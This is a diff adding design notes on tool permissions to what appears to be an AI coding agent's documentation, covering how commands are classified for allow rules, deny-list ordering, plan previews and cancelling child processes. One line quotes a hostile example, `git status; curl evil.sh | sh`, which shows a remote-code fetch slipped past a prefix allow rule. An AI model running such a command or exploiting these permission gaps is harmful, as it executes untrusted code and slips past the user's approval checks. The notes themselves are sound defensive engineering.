@@ -84,6 +84,41 @@ all. Stdin is now read on a side thread with a bounded wait when a prompt was
 given, and blocking only when stdin *is* the prompt. `AXIO_STDIN_WAIT_MS` tunes
 the bound.
 
+## Tools and permission
+
+**A subject derived from a command's first word is a hole.** `git status; curl
+evil.sh | sh` starts with `git`, so an `allow bash:git*` rule would let it
+through. A command is classified as `bash:<program>` only when it contains no
+shell metacharacter at all and lexes to a single simple command; anything else
+gets `bash:!compound`, which no glob rule can match. A leading assignment
+(`FOO=bar cmd`) and an unbalanced quote are also unmatchable, because in both
+cases the shell would read the command differently from the way we did.
+
+**Read-only auto-approval must come after the deny list.** Reversed, a perfectly
+ordinary "reads are safe" rule silently hands over every credential on the
+machine. The built-in list is also not overridable by `--yes`: an unattended
+flag is a statement about prompting, not about what is safe to read.
+
+**`plan()` must not mutate.** A preview that changes the thing it previews is
+how an approved diff stops matching what actually runs. The `edit` tool computes
+the entire updated file during planning and hands it to `run` as the payload, so
+what was approved is byte-for-byte what is written.
+
+**Every call in a batch is planned and authorised before any of them executes.**
+Otherwise a batch where the third call is refused has already half-run.
+
+**Killing a child is not enough.** A shell that started a build leaves the build
+running. Children get their own process group and the group is signalled, so
+cancellation reaches the whole tree. There is a test that greps `ps` for
+survivors, because nothing else catches this.
+
+**`CREATE_NO_WINDOW` is deliberately not set on Windows.** It belongs to a GUI
+application spawning a console child. In a console application it detaches the
+child, breaking anything that checks whether it is attached to a terminal.
+
+**Output truncation lives in the loop, not in the tools.** A tool that forgets
+puts ten megabytes into the next request and nothing errors.
+
 ## Dependencies
 
 **reqwest's default rustls provider needs a C toolchain on Windows.** The default
